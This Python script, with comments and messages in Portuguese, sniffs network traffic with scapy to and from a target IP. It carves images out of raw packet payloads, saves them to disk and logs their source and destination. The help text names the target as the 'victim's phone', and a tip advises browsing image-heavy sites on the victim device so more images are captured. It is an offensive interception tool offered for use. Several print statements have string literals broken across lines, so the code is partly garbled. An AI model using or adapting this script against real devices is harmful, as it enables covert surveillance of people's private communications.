#!/usr/bin/env python3
# ============================================
# CAPTURA DE IMAGENS DO TRÁFEGO
# Extrai imagens enviadas pela rede
# ============================================

import sys
import os
import json
from datetime import datetime
from pathlib import Path

try:
    from scapy.all import sniff, IP, TCP, Raw
except ImportError:
    print("[!] Scapy não instalado. Execute: pip install scapy")
    sys.exit(1)

class ImageCapture:
    def __init__(self, target_ip="192.168.1.200", output_dir="captured_images"):
        self.target_ip = target_ip
        self.output_dir = output_dir
        self.captured_images = []
        self.image_signatures = {
            b'\xFF\xD8\xFF': 'jpg',
            b'\x89PNG': 'png',
            b'GIF87a': 'gif',
            b'GIF89a': 'gif',
            b'BM': 'bmp',
            b'RIFF': 'webp'
        }
        
        # Criar diretório de saída
        Path(self.output_dir).mkdir(exist_ok=True)
        print(f"[+] Imagens serão salvas em: {self.output_dir}/")
    
    def identify_image(self, data):
        """Identificar tipo de imagem pela assinatura"""
        for signature, img_type in self.image_signatures.items():
            if data.startswith(signature):
                return img_type
        return None
    
    def extract_images_from_payload(self, payload, source_ip, dest_ip):
        """Extrair imagens do payload"""
        images_found = []
        
        # Procurar por assinaturas de imagem
        for signature, img_type in self.image_signatures.items():
            offset = 0
            while True:
                pos = payload.find(signature, offset)
                if pos == -1:
                    break
                
                # Encontrou uma assinatura, tentar extrair
                # Procurar pelo fim da imagem (heurística)
                if img_type == 'jpg':
                    # JPG termina com FF D9
                    end_marker = b'\xFF\xD9'
                    end_pos = payload.find(end_marker, pos)
                    if end_pos != -1:
                        image_data = payload[pos:end_pos+2]
                        if len(image_data) > 100:  # Mínimo de bytes
                            images_found.append((image_data, img_type))
                            offset = end_pos + 2
                        else:
                            offset = pos + 1
                    else:
                        offset = pos + 1
                
                elif img_type == 'png':
                    # PNG termina com IEND
                    end_marker = b'IEND\xae\x42\x60\x82'
                    end_pos = payload.find(end_marker, pos)
                    if end_pos != -1:
                        image_data = payload[pos:end_pos+8]
                        if len(image_data) > 100:
                            images_found.append((image_data, img_type))
                            offset = end_pos + 8
                        else:
                            offset = pos + 1
                    else:
                        offset = pos + 1
                
                elif img_type in ['gif', 'bmp', 'webp']:
                    # Para outros formatos, extrair até 1MB
                    end_pos = min(pos + 1024*1024, len(payload))
                    image_data = payload[pos:end_pos]
                    if len(image_data) > 100:
                        images_found.append((image_data, img_type))
                    offset = end_pos
                else:
                    offset = pos + 1
        
        return images_found
    
    def save_image(self, image_data, img_type, source_ip, dest_ip):
        """Salvar imagem em arquivo"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
            filename = f"image_{timestamp}.{img_type}"
            filepath = os.path.join(self.output_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            image_info = {
                'timestamp': datetime.now().isoformat(),
                'filename': filename,
                'filepath': filepath,
                'size': len(image_data),
                'type': img_type,
                'source': source_ip,
                'destination': dest_ip
            }
            
            self.captured_images.append(image_info)
            
            print(f"[+] Imagem capturada: {filename} ({len(image_data)} bytes)")
            print(f"    De: {source_ip} → Para: {dest_ip}")
            print(f"    Tipo: {img_type.upper()}")
            print()
            
            return image_info
        except Exception as e:
            print(f"[!] Erro ao salvar imagem: {e}")
            return None
    
    def packet_callback(self, packet):
        """Callback para cada pacote"""
        if IP not in packet:
            return
        
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        # Filtrar apenas tráfego do alvo
        if src_ip != self.target_ip and dst_ip != self.target_ip:
            return
        
        # Procurar por dados
        if Raw in packet:
            try:
                payload = bytes(packet[Raw].load)
                
                # Procurar por imagens
                images = self.extract_images_from_payload(payload, src_ip, dst_ip)
                
                for image_data, img_type in images:
                    self.save_image(image_data, img_type, src_ip, dst_ip)
            
            except Exception as e:
                pass
    
    def display_summary(self):
        """Exibir resumo das imagens capturadas"""
        print("
" + "="*80)
        print("📸 RESUMO DE IMAGENS CAPTURADAS")
        print("="*80 + "
")
        
        if not self.captured_images:
            print("[*] Nenhuma imagem capturada")
            return
        
        print(f"Total de imagens: {len(self.captured_images)}
")
        
        # Agrupar por tipo
        types = {}
        for img in self.captured_images:
            img_type = img['type'].upper()
            if img_type not in types:
                types[img_type] = []
            types[img_type].append(img)
        
        for img_type, images in types.items():
            print(f"{img_type}: {len(images)} imagens")
            total_size = sum(img['size'] for img in images)
            print(f"  Tamanho total: {total_size:,} bytes
")
        
        print("Imagens capturadas:")
        for i, img in enumerate(self.captured_images, 1):
            print(f"{i}. {img['filename']}")
            print(f"   Tamanho: {img['size']:,} bytes")
            print(f"   Tipo: {img['type'].upper()}")
            print(f"   De: {img['source']} → Para: {img['destination']}")
            print(f"   Caminho: {img['filepath']}")
            print()
        
        print("="*80 + "
")
    
    def export_manifest(self):
        """Exportar manifesto de imagens capturadas"""
        manifest = {
            'timestamp': datetime.now().isoformat(),
            'target_device': self.target_ip,
            'total_images': len(self.captured_images),
            'images': self.captured_images
        }
        
        manifest_file = os.path.join(self.output_dir, 'manifest.json')
        
        try:
            with open(manifest_file, 'w') as f:
                json.dump(manifest, f, indent=2)
            print(f"[+] Manifesto exportado: {manifest_file}")
        except Exception as e:
            print(f"[!] Erro ao exportar manifesto: {e}")
    
    def run(self):
        """Iniciar captura"""
        print("
" + "="*80)
        print("📸 CAPTURA DE IMAGENS DO TRÁFEGO")
        print("Laboratório Demoníaco - Demonstração Impressionante")
        print("="*80 + "
")
        
        print(f"[+] Alvo: {self.target_ip}")
        print(f"[+] Diretório de saída: {self.output_dir}/")
        print("[*] Capturando imagens... Pressione Ctrl+C para parar
")
        print("💡 DICA: Abra sites com imagens no celular vítima para capturar!
")
        
        try:
            sniff(
                prn=self.packet_callback,
                store=False,
                filter=f"host {self.target_ip}"
            )
        
        except KeyboardInterrupt:
            print("\n[*] Captura interrompida")
            self.display_summary()
            self.export_manifest()
        
        except PermissionError:
            print("[!] Erro: Privilégios de administrador necessários")
            print("    Execute com: sudo python3 image_capture.py")
            sys.exit(1)
        
        except Exception as e:
            print(f"[!] Erro: {e}")
            sys.exit(1)

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Captura imagens do tráfego de rede"
    )
    parser.add_argument(
        "--target", "-t",
        help="IP do celular vítima",
        default="192.168.1.200"
    )
    parser.add_argument(
        "--output", "-o",
        help="Diretório de saída",
        default="captured_images"
    )
    
    args = parser.parse_args()
    
    capture = ImageCapture(
        target_ip=args.target,
        output_dir=args.output
    )
    
    capture.run()
